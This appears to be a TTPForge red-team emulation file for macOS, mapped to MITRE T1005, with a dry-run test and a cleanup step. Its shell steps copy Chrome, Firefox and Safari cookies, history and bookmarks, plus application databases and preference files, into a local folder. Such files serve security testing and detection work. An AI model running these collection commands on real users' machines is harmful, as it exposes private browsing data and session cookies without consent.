---
api_version: 2.0
uuid: 82c9b2ea-419f-4727-a271-25a526d8b79f
name: Collect Application Data
authors:
- TTPForge
description: |
  Collect data from user applications including caches, preferences, and databases
mitre:
  tactics:
  - TA0009 Collection
  techniques:
  - T1005 Data from Local System
requirements:
  platforms:
  - os: darwin
args:
- name: output_path
  description: Output path for application data
  type: string
  default: /tmp/app_data
- name: target_apps
  description: Comma-separated list of apps to collect from
  type: string
  default: Chrome,Firefox,Safari,Slack
steps:
- name: Create output directory
  inline: mkdir -p {{ .Args.output_path }}
- name: Collect Chrome data
  inline: |
    chrome_path="$HOME/Library/Application Support/Google/Chrome"
    if [ -d "$chrome_path" ]; then
      mkdir -p {{ .Args.output_path }}/chrome
      cp -r "$chrome_path"/Default/History "{{ .Args.output_path }}/chrome/" 2>/dev/null || true
      cp -r "$chrome_path"/Default/Cookies "{{ .Args.output_path }}/chrome/" 2>/dev/null || true
      cp -r "$chrome_path"/Default/Cache "{{ .Args.output_path }}/chrome/" 2>/dev/null || true
    fi
- name: Collect Firefox data
  inline: |
    firefox_path="$HOME/Library/Application Support/Firefox"
    if [ -d "$firefox_path" ]; then
      mkdir -p {{ .Args.output_path }}/firefox
      find "$firefox_path" -name "places.sqlite" -exec cp {} "{{ .Args.output_path }}/firefox/" \; 2>/dev/null || true
      find "$firefox_path" -name "cookies.sqlite" -exec cp {} "{{ .Args.output_path }}/firefox/" \; 2>/dev/null || true
    fi
- name: Collect Safari data
  inline: |
    safari_path="$HOME/Library/Safari"
    if [ -d "$safari_path" ]; then
      mkdir -p {{ .Args.output_path }}/safari
      cp -r "$safari_path/History.db" "{{ .Args.output_path }}/safari/" 2>/dev/null || true
      cp -r "$safari_path/Bookmarks.plist" "{{ .Args.output_path }}/safari/" 2>/dev/null || true
    fi
- name: Collect application support data
  inline: |
    mkdir -p {{ .Args.output_path }}/app_support
    find ~/Library/Application\ Support -maxdepth 2 -name "*.db" -o -name "*.sqlite" 2>/dev/null | head -30 | xargs -I {} cp {} {{ .Args.output_path }}/app_support/ 2>/dev/null || true
- name: Collect preferences
  inline: |
    mkdir -p {{ .Args.output_path }}/preferences
    find ~/Library/Preferences -name "*.plist" 2>/dev/null | head -20 | xargs -I {} cp {} {{ .Args.output_path }}/preferences/ 2>/dev/null || true
  cleanup:
    inline: |-
      rm -rf {{ .Args.output_path }}
      test ! -d {{ .Args.output_path }} && echo "Application data cleanup completed"
tests:
- name: dry_run_test
  dry_run: true
